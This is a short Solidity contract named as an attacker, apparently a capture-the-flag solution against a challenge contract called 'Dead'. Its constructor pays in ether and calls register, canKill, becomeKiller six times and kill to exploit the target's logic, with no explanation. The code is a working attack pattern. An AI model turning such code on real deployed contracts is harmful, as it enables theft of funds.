pragma solidity 0.7.4;

import "./Dead.sol";

contract kankan0Attacker {
    
    constructor(Dead instance) payable {
        require(msg.value > 0.65 ether);
        instance.register{value: 0.01 ether}();
        instance.canKill();
        for(uint8 i = 0; i < 6; i++) {
            instance.becomeKiller{value:0.099 ether}();
        }
        instance.kill();
    }

    receive() external payable { }

}